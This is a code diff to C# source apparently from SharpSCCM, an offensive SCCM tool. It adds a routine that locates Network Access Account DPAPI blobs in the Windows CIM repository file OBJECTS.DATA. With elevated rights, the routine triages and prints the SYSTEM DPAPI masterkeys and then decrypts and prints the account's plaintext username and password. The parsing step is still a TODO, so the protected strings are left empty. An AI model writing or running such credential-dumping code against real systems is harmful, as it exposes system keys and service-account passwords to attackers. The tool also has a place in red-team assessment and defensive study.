@@ -11,9 +11,11 @@ namespace SharpSCCM
         public static void LocalNetworkAccessAccountsDisk()
         {
             Console.WriteLine($"[*] Retrieving Network Access Account blobs from CIM repository\n");
+
             // Path of the CIM repository
             string cimRepoPath = "C:\\Windows\\System32\\Wbem\\Repository\\OBJECTS.DATA";
 
+            // We don't have to be elevated to read the blobs...
             // get size of file
             FileInfo cimRepo = new FileInfo(cimRepoPath);
             uint bytesToSearch = (uint) (int) cimRepo.Length;
@@ -25,6 +27,37 @@ namespace SharpSCCM
             else
             {
                 Console.WriteLine($"[!]     No DPAPI blob found");
+            }
+
+            // Parse from CIM repo
+            string protectedUsername = "";
+            string protectedPassword = "";
+
+            // TODO -- Logic to strip blob
+            // But we do have to be elevated to retrieve the system masterkeys...
+            if (Helpers.IsHighIntegrity())
+            {
+                Dictionary<string, string> mappings = Dpapi.TriageSystemMasterKeys();
+                foreach (KeyValuePair<string, string> kvp in mappings)
+                {
+                    Console.WriteLine("{0}:{1}", kvp.Key, kvp.Value);
+                }
+                Console.WriteLine();
+
+                try
+                {
+                    string username = Dpapi.Execute(protectedUsername, mappings);
+                    string password = Dpapi.Execute(protectedPassword, mappings);
+
+                    Console.WriteLine("\r\n[*] Triaging Network Access Account Credentials\r\n");
+                    Console.WriteLine("     Plaintext NAA Username         : {0}", username);
+                    Console.WriteLine("     Plaintext NAA Password         : {0}\n", password);
+                }
+                catch (Exception e)
+                {
+                    Console.WriteLine("[!] Data was not decrypted. An error occurred.");
+                    Console.WriteLine(e.ToString());
+                }
             }
         }
 
